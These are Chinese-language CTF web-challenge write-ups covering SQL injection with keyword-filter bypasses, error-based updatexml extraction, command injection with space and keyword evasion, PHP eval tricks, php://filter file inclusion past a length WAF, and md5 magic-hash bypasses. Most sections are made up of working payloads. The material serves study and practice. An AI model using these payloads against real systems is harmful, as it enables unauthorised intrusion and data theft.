# 基础
##  Babysql
万能公式起手

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203725280-0f68a7f7-659a-46e1-bed2-d2ed9f84c952.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203753482-6d98ce83-a9e7-4fa5-b29a-b2bec258abe4.png)

根据回显报错发现or被过滤掉了 于是用 <font style="color:#601BDE;">|| </font><font style="color:#000000;">来代替</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203838539-b343b1d4-0cf2-4412-aa13-869658e328a4.png)

又发现了这个回显页面 还是试着用联合注入寻找回显位置

```sql
1' union select 1,2,3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732203972208-4ea33db5-541b-4553-bf75-03196722dca0.png)

根据回显报错发现union select 被过滤了

双写绕过

```sql
1' ununionion selselectect 1,2,3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732204696895-ae4b3211-aaf0-4de5-8fa9-27c207495f48.png)

爆出数据库名字payload

```sql
1'  ununionion selselectect 1,2,database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732204912329-1d7b4e7a-696d-4db2-b2a4-76c2c3c3add9.png)

接着构建payload爆数据库中的表名

```sql
1'  ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732205168959-8a21606f-5d70-40dd-8560-46284a8662ff.png)

回显报错发现or where from被过滤了 需要双写绕过构建新的payload

```sql
1'  ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database() #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732205635674-0424f1bf-4ecd-4ae4-b31d-f31564119790.png)

得到数据库geek下有两张表分别为'b4bsql' 'geekuser' 根据题目名字flag大概率在b4bsql表中

构建payload爆字段名

```sql
1'  ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='b4bsql' #
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206002083-660fa353-d3e9-422a-bf09-0ec3180e8c91.png)

再构建payload爆出三个字段的值

```sql
1'  ununionion selselectect 1,2,group_concat(id) frfromom b4bsql #
1'  ununionion selselectect 1,2,group_concat(username) frfromom b4bsql #
1'  ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql #  //or被过滤了所以要双写
```

爆出结果

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206164623-26730f76-0a08-4185-9b27-65f606345827.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206189845-fa05bd59-7641-42cc-967d-d48cbed0a148.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732206292570-ab77a2f5-f022-4b68-8cbc-5a6e0436ae07.png)

得到flag

## [SWPUCTF 2021 新生赛]babyrce
打开页面后发现一段脚本

```php
 <?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 
```

通过代码审计得知 题目需要我们上传cookie参数admin值为1

利用hackbar上传

 ![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736514795605-8ebcd99b-e338-4837-8ca8-4724eb84150f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736514810161-7a0f940e-1eca-4330-a41b-7736b212be87.png)

出现了这个文件名称 访问 rasalghul.php出现了一段php代码

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?> 
```

发现存在命令执行漏洞 并且过滤了空格  我们可以利用%09代替空格

```php
?url=ls%09/
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736515123609-516e4d5b-72ee-48fe-af18-aec17c0af666.png)

发现flag存在根目录下方 利用cat命令读取flag

```php
?url=cat%09/flllllaaaaaaggggggg
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736515272843-60b84841-53c8-4603-9c72-a4efb2c39c95.png)

## [SWPUCTF 2021 新生赛]finalrce
代码审计

```php
<?php
  highlight_file(__FILE__);
if(isset($_GET['url']))
{
  $url=$_GET['url'];
  if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
  {
    echo "Sorry,you can't use this.";
  }
  else
  {
    echo "Can you see anything?";
    exec($url);
  }
}
```

发现过滤了许多函数 但是没有过滤 | 和 \ 所以我们可以利用命令进行读取

```php
command | tee 文件名
```

payload

```php
?url=l\s / | tee 1.txt
```

然后访问1.txt文件

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736470111984-8817b79c-feb7-4e53-a17f-f19d365c8c03.png)

发现flllllaaaaaaggggggg疑似flag  由于cat被禁用了 所以我们使用tac

```php
url=tac /flllllaaaaaaggggggg | tee 2.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736470317232-519e61a7-d2dd-47b0-a7fd-4ddcb6c5ddc0.png)

发现还是被过滤了 才发现la也被禁用 于是

```php
?url=tac /flllll\aaaaaaggggggg | tee 2.txt
```

写入后访问2.txt得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736470459107-ec8aec70-864a-4d25-93a9-671e5f609232.png)

## [ACTF2020 新生赛 Exec]
随便输入一个地址127.0.0.1 发现存在回显 可以确定是命令执行漏洞

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736471085984-e978dade-fc94-4a63-b670-e73d306e9e39.png)

接着利用命令列出根目录

```php
127.0.0.1 & ls /
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736471266224-1af06f99-2da4-45a8-b8fa-fb19b1608750.png)

发现flag文件 接着

```php
127.0.0.1 & cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736471311296-738f9bf9-46a5-4c7e-82c0-372c37f88c2e.png)

得到flag

## [SWPUCTF 2022 新生赛]webdog1__start
```php
Do you really reading to start be a web dog? DO you think you go here from where? 
```

根据提示鼠标右键打开源代码 发现提示

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736486122646-46e58bb1-1596-4e0a-8f4e-6379b2f2edc3.png)

需要上传一个参数web使first绕过md5  我们使用0e绕过 寻找一个开头为0e且md5加密后也为0e的字符串

payload

```php
?web=0e215962017  //这个值是可以搜出来 
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736491115266-af2ededf-a2f8-4fba-abba-f301bfe3495f.png)

进入页面后发现就一个search按钮可以点 没什么头绪 利用burpsite抓个包看看

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736491207893-0f8950de-a888-4e06-9e64-cffcfc57dd24.png)

发现响应包给了提示 让我们访问f14g.php

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736491332505-b35ff8d7-0b81-42ac-8d70-37001e29ab30.png)

发现被骗了 接着抓包 还是在响应头里找到提示

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736491391520-de0aa8c4-8a51-4fe8-8ecd-602acad2c60a.png)

访问 F1l1l1l1l1lag.php

发现一段php代码

```php
<?php
error_reporting(0);


highlight_file(__FILE__);



if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }

}
```

发现存在命令执行漏洞 但是要绕过过滤和限制

利用%09绕过空格

```php
?get=system('ls%09/');
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736492897467-d94eb5cc-5147-44b4-ae7f-17de69841d09.png)

发现更目录下面有flag

```php
?get=system('cat%09/flag');
```

由于有长度限制 所以使用通配符缩短payload

```php
?get=system('tac%09/f*');
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736493174819-4b590f30-5b2b-475b-91d7-35b290879bc7.png)

# 进阶
## [SWPUCTF 2021 新生赛]easy_sql
根据题目提示是一道sql注入题目 点进去之后没有明显的注入点 打开页面源代码发现参数是wllm 并且是get方式传参

```python
?wllm=1   //正常回显
?wllm=1'  //报错
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736517995054-ebbb05e9-8aea-4010-8fc9-ba09f1910818.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736517978467-479f102b-f69b-4596-8558-feacddc53824.png)

所以判断为字符型注入 于是查看字列段数

```sql
?wllm=-1' order by 1--+
?wllm=-1' order by 2--+
?wllm=-1' order by 3--+
?wllm=-1' order by 4--+
```

发现到4时显示显示错误 所以子列段数围为3 接着使用联合查询寻找回显位置

```sql
?wllm=-1' union select 1,2,3--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736518387179-7448fe05-8aae-4ffb-9a3e-d22019e5d1b0.png)

发现2和3位置可以回显 接着查询数据库名称

```sql
?wllm=-1' union select 1,2,database()--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736518481286-0187c7da-b43e-4fd8-9e94-7ba7d661957d.png)

爆出数据库名称为test_db 接着查询表名

```sql
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736518683818-927adddf-ac12-494f-99bb-3f49b7afb1bf.png)

查询出了两个表名分别为test _tb 和 user 接着查询表中的字段名

```sql
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+ 
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736519085030-1bd2c8eb-e594-4786-8305-fc3a82507421.png)

```sql
?wllm=-1' union select 1,2,group_concat(flag) from test_tb--+
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736519236744-9750b794-c8ea-4bd2-a5fe-54287323e7ad.png)

## [GXYCTF2019禁止套娃]
![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736576809404-c3362fb5-dfb3-46af-808e-a8fc6a4783d0.png)

打开靶机发现没有什么特殊的地方 抓包也没抓出什么线索 于是利用dirsearch扫描目录 发现git目录下正常

怀疑是git源代码泄露

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736568935614-49162047-1be0-4e96-ac86-142cb02c5153.png)

接着利用GitHack工具爬取文件内容 但是试了几次爬不下来

于是改用scrabble工具 爬下来个index.php文件

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736577176996-ae659f40-491e-46ed-8684-4b486933e562.png)

```sql
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

由代码审计 传参经过了三层过滤

第一层过滤了伪协议 所以不考虑伪协议的使用

第二层正则表达式匹配含义是匹配var_dump(scandir())这种无参数命令执行

第三层过滤了一些函数

线利用以下函数构造payload

```sql
current() ：返回数组中的单元，默认取第一个值。
localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’这个.的用处很大）
scandir() :将返回当前目录中的所有文件和目录的列表。
```

<font style="color:rgb(77, 77, 77);">scandir('.')是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看</font>

```sql
?exp=var_dump(scandir(current(localeconv())));
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736578889878-ba039e94-f80f-4230-b550-bb630dd75f94.png)

<font style="color:rgb(77, 77, 77);">查看到flag.php在当先数组的第4个位置，所以需要移动指针 </font>

<font style="color:rgb(77, 77, 77);">最后利用next() array_reverse() show_source() 读取flag</font>

```plain
?exp=var_dump(show_source(next(array_reverse(scandir(current(localeconv()))))));
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736579317019-fa9b2790-2c54-48d5-9575-daaa5fa49d4f.png)

## [鹏城杯 2022简单包含]
打开靶机发现一段php代码

```php
<?php 
  highlight_file(__FILE__);
include($_POST["flag"]);
//flag in /var/www/html/flag.php; 
```

题目提示flag的位置 且存在文件包含漏洞 以post方式传参 用php伪协议读取内容 

```php
flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736584349516-91a4e78d-a761-47a3-bf12-1ef707b6f84c.png)

发现存在waf 于是我们试着读取index.php看看如何绕过waf

```php
flag=php://filter/read=convert.base64-encode/resource=index.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736584765670-7102ffaf-e5fd-4e33-8c42-a14beeb81ca1.png)

解密后得到代码

```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
```

通过代码审计 当上传参数小于800时会过滤掉flag 所以我们要上传超过800长度的参数

```php
a=........&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
//省略号部分随便添加数据只要让总长度超过800即可
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736585104864-70ac57e6-dc6c-421a-adac-c4b78e902c64.png)

解密得到flag

## [md5简单题目]
```php
<?php
highlight_file(__FILE__);
include_once('flag.php');

if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo $flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?> 
```

通过代码审计 要通过四层审核才会输出flag

第一层需要以post形式上传参数a 参数a不能出现数字 并且要使intval(a)为真 我们可以使用数组绕过

```php
a[]=1
```

第二层只要上传参数就可以

第三层需要参数b1!=b2 并且他们的md5值强相等 我们还是可以使用数组绕过

```php
a[]=1&b1[]=1&b2[]=3
```

第四层同样需要参数c1!=c2 并且c1和c2必须是字符串 且二者的md5值弱相等  我们可以使用0e绕过

只需要寻找md5值为0e开头的两个不同字符串即可  md5值为0e开头的常用字符串有

```php
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
0e215962017
```

所以payload

```php
a[]=1&b1[]=1&b2[]=3&c1=QNKCDZO&c2=240610708
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736587375178-cd37c8f3-4520-445c-b8bc-3f287f427f85.png)

## [进阶md5]
![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736590335461-a3e21439-ecc8-45f5-bdde-ef42317c8c30.png)

自己瞎试一边不知道 用搜索引擎搜出来是ffifdyop  

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736590268233-9ece6bb6-e20e-42e5-9923-afec452e9093.png)

输入后页面发生跳转

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736602047014-1f0a88ae-7409-4b33-86a1-269685e661fd.png)

接着打开源代码

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736602073292-17e5a483-8eb9-478f-9ec7-d55eba9fab07.png)

要求get方式上传x和y参数 并且x!=y 二者的md5值相等 可以利用数组绕过或者0e绕过

```php
?x[]=1&y[]=2
```

绕过后又出现了一段php代码

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
} 
```

要求以post方式上传wqh和dsy两个参数 两个参数不相等 md5值强相等 这里我们只能使用数组绕过

```php
wqh[]=1&dsy[]=2
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736602591579-9c92cd72-3cd3-4812-a076-34489ac4b6c4.png)

# 挑战自我
##  [更难一点的极客大挑战 2019HardSQL ]
尝试万能公式

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732240304379-7a9dcb86-c085-47e9-9055-c6f176be24c6.png)

很明显 被过滤了行不通 接着试着union联合查询 双写之后还是被过滤了

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732240304379-7a9dcb86-c085-47e9-9055-c6f176be24c6.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

尝试用报错注入 爆数据库payload

```sql
username=1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732249239887-b533f9f7-97ef-4bb8-924f-fd5e7f966ef6.png)

爆出了数据库名字为'geek'

接着查询表名 由于=被过滤了 所以使用like去代替

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732250235550-b582f850-3f2e-4d12-879d-801345c838c1.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

得到表名为'~H4rDsql~' 构建payload去爆字段名

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732250700420-3c81d32b-1882-4e36-878c-c0019ca28ef8.png)

发现字段名有id username password

构建payload去爆字段名的值

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732251461961-d4b7a091-d7da-4f92-99e7-b35e957ad322.png)

发现flag但是只有一半 我们可以利用right函数把右边的那部分给爆出来

新的payload

```sql
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#
password=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732251797766-87989482-b021-4f0f-8235-99d9f27a52ee.png)

拼接起来得到flag

```sql
flag{c69ed473-7a5f-48be-a6cd-950392dcb940}
```

## [比较复杂一点的题目，关于php]
打开靶机后查看原代码 发现提示bot 怀疑是不是存在robots协议

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736649973206-9dfbaf53-86c4-4c3c-84a8-0c52cc2c3052.png)

访问robots.txt  提示/fAke_f1agggg.php

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736650007339-d9f4f13f-7c49-4d37-b9bb-5aa3fc824e7c.png)

接着访问/fAke_f1agggg.php 但是好像被骗了

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736650101406-d4c15385-a35c-4800-ac24-fcaaa6d2f4ac.png)

尝试使用burpsite抓包找线索 最后在访问/fAke_f1agggg.php的响应包中找到线索

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736650430567-110fa534-da28-4f27-974f-25dfe9282f18.png)

提示我们访问/fl4g.php 出现php代码

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
```

通过代码审计拿到flag需要经过三层限制

第一次需要绕过intval函数的矛盾条件 我们可以利用intval函数的性质来绕过

```php
根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，
函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值
```

所以payload

```php
?num=3e6     //不唯一 只要使字符串e前面的数字小于2020 科学技术法的值大于2020即可
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736651499767-d64ad779-8085-494a-afa7-e28f81d8b8e9.png)

显示劳力士说明绕过成功 

第二层限制要求上传的参数值和md5值弱项等

根据弱相等的性质我们可以使用0e绕过 于是我们只需上传以0e开头后面全是数字并且md5值也是以0e开头后面全是数字即可 所以paylaod

```php
?num=3e6&md5=0e215962017
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736651963784-f127b3c4-bcfd-4dfe-9318-25f03626224b.png)

出现语句说明成功通过 

第三层限制上传的参数要求不能出现空格和cat 于是我们可以使用%09代替空格 head代替cat

先查看根目录

```php
?num=3e6&md5=0e215962017&get_flag=ls%09/
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736652699245-7f9705d8-61fa-4089-9dbc-eb0300bd9bd4.png)

发现并没有发现flag 于是改用ls查看网站下的目录

```php
?num=3e6&md5=0e215962017&get_flag=ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736652765047-2bf64f7e-5e0d-4af7-8a57-b693a0688baa.png)

发现flag 直接

```php
?num=3e6&md5=0e215962017&get_flag=head%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1736653040771-7e6cad52-466a-4b93-9fe1-2e1f9577083d.png)

